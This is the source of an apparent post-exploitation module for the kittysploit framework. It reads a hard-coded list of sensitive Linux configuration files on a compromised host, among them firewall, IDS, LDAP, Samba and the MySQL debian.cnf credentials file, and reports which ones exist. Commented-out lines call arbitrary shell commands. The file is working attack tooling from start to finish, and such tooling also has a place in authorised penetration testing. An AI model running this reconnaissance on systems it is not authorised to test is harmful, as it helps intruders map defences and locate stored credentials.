from kittysploit import *

class Module(Post, System):

	__info__ = {
		"name": "Linux Gather Configurations",
		"description": "Linux Gather Configurations",
		"type": "shell",
	}	
		
	def run(self):

		configs = [
		  "/etc/apache2/apache2.conf", "/etc/apache2/ports.conf", "/etc/nginx/nginx.conf",
		  "/etc/snort/snort.conf", "/etc/mysql/my.cnf", "/etc/ufw/ufw.conf",
		  "/etc/ufw/sysctl.conf", "/etc/security.access.conf", "/etc/shells",
		  "/etc/security/sepermit.conf", "/etc/ca-certificates.conf", "/etc/security/access.conf",
		  "/etc/gated.conf", "/etc/rpc", "/etc/psad/psad.conf", "/etc/mysql/debian.cnf",
		  "/etc/chkrootkit.conf", "/etc/logrotate.conf", "/etc/rkhunter.conf",
		  "/etc/samba/smb.conf", "/etc/ldap/ldap.conf", "/etc/openldap/openldap.conf",
		  "/etc/cups/cups.conf", "/etc/opt/lampp/etc/httpd.conf", "/etc/sysctl.conf",
		  "/etc/proxychains.conf", "/etc/cups/snmp.conf", "/etc/mail/sendmail.conf",
		  "/etc/snmp/snmp.conf"
		]

		distro = self.get_sysinfo()['distro']
		print_status(distro)
		print_status(f"Finding configuration files...")
		for c in configs:
			output = self.read_file(c).strip()
			if len(output) == 0:
				continue
			elif "No such file or directory" in output:
				continue
			elif f"cat: {c}:" in output:
				continue
			else:
				print_status(c)
#		print_info(self.read_file('/tmp/a.txt'))
#		print_info(self.get_sysinfo()['distro'])
#		res = self.cmd_exec(self.command) 
#		print_info(res)
